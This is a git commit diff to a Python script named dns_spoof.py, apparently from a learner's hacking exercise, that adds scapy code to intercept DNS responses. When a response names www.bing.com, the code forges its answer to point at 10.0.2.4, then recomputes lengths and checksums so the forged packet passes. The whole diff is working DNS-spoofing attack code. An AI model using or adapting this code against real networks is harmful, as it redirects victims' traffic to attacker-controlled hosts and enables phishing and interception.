20220d515439fadfb5b0fcff6456b5e9e3841524
developerkhashab <mohammad.khashab.mk@gmail.com>
2020-04-14 14:00:14 -0400

    Add net_cut to modify DNS

--- Dns_spoof/dns_spoof.py
+++ Dns_spoof/dns_spoof.py
@@ -5,7 +5,22 @@ import scapy.all as scapy
 
 def process_packet(packet):
     scapy_packet=scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname=scapy_packet[scapy.DNSRR].qname
+        if "www.bing.com" in qname:
+            print('[+] Spoofing target')
+            answer=scapy.DNSRR(rrname=qname,rdata="10.0.2.4")
+            scapy_packet[scapy.DNS].an=answer
+            scapy_packet[scapy.DNS].ancount=1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+            packet.set_payload(str(scapy_packet))
+
+
+
     packet.accept()
 
 
